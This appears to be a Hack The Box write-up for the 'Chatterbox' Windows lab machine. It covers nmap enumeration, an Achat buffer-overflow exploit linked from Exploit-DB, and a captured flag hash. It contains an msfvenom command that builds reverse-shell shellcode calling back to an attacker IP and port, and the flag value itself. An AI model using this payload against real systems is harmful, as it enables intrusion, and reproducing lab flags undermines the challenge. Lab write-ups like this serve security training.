---
layout: default
title: x001-Chatterbox
nav_order: 2
has_children: true
parent: htb
grand_parent: writeups
---
## x001-Chatterbox 

### Abstract

Windows Machine


### Service Enumeration

The service enumeration portion of a penetration test focuses on gathering information about what services are alive on a system or systems.
This is valuable for an attacker as it provides detailed information on potential attack vectors into a system.

Understanding what applications are running on the system gives an attacker needed information before performing the actual penetration test.
In some cases, some ports may not be listed.



| Server IP Adress | Ports Open |
|------------------|------------|
|     192.168.126.93      | TCP :  135,139,445,9255;9256,49152-57    |
|                  | UDP :      |



**Nmap Scan Results:**

Using  :
```sh
nmap -A -T4 -p- 10.10.10.74 -oN chatterbox.htb.nmap
```

Result :
```sh
# Nmap 7.93 scan initiated Thu Mar 16 19:32:28 2023 as: nmap -A -T4 -p- -oN chatterbox.htb.nmap 10.10.10.74
Nmap scan report for 10.10.10.74
Host is up (0.042s latency).
Not shown: 65524 closed tcp ports (conn-refused)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
9255/tcp  open  tcpwrapped
9256/tcp  open  tcpwrapped
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: CHATTERBOX; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h20m00s, deviation: 2h18m35s, median: 4h59m59s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2023-03-16T23:34:01
|_  start_date: 2023-03-16T23:21:02
| smb2-security-mode: 
|   210: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Chatterbox
|   NetBIOS computer name: CHATTERBOX\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-03-16T19:34:02-04:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Mar 16 19:34:14 2023 -- 1 IP address (1 host up) scanned in 105.93 seconds  
```

**Vulnerability Exploited:** BufferOverflow in Achat

**Vulnerability Explanation:**

Using available exploit, we were able to gain initial access to the server.

**Vulnerability Fix:** Upgrade to the latest version.

**Severity:** CRITICAL

**Proof of Concept / Code Here:**

![](/writings/docs/assets/Pasted%20image%2020230319141321.png)

![](/docs/assets/Pasted%20image%2020230319141321.png)

[Exploit DB](https://www.exploit-db.com/exploits/36025)

We generate the bytecode with the following command: 

```bash
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.14.56 LPORT=443 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
```

And inject the output inside the python script then run it with our tcp handler waiting for a connection. 

![](/writings/docs/assets/Pasted%20image%2020230319142012.png)

![](docs/assets/Pasted%20image%2020230319142012.png)

**Local.txt Proof Screenshot**

![](docs/assets/Pasted%20image%2020230319142322.png)

![](/writings/docs/assets/Pasted%20image%2020230319142322.png)

**Local.txt Contents**

`1e488e7ce084019eebcbcb7f84889719`

### Privilege Escalation

**Vulnerability Exploited:**

**Vulnerability Explanation:**

**Vulnerability Fix:**

**Severity:**

**Proof of Concept / Code Here:**

**Proof Screenshot Here:**

**Proof.txt Contents:**


--------

### NOTES : 
